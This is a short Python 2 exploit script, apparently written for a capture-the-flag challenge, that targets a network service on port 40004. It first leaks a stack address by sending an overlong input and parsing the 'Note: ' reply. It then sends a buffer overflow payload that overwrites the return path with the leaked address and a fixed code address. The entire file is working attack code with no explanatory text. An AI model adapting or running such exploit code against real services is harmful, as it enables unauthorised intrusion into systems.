import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib
import time,random
import sys

LOCAL = ('localhost',40004)
LOCAL = (sys.argv[1],40004)
# LOCAL = ('128.199.133.96',31331)
BUFFER = 4096

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)


def recv_until(str,debug=1):
    recv_ = ''
    while not str in recv_:
        tmp = s.recv(BUFFER)
        recv_ += tmp
        if debug:
            print tmp
        continue
    return recv_

recv_until('>')
s.send('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|11/11/1|\n');
data = recv_until('Note')
stack = unpack('<I','\x00'+data.split('Note: ')[1][:3])[0]
print hex(stack)

s.send('.exit\n')
raw_input("?")
payload = 'A'*128
payload += pack('<I',stack)*5
payload += pack('<I',0x8048970)
recv_until('else')
s.send(payload+"\n")

print s.recv(BUFFER)
print s.recv(BUFFER)
print s.recv(BUFFER)

s.close()



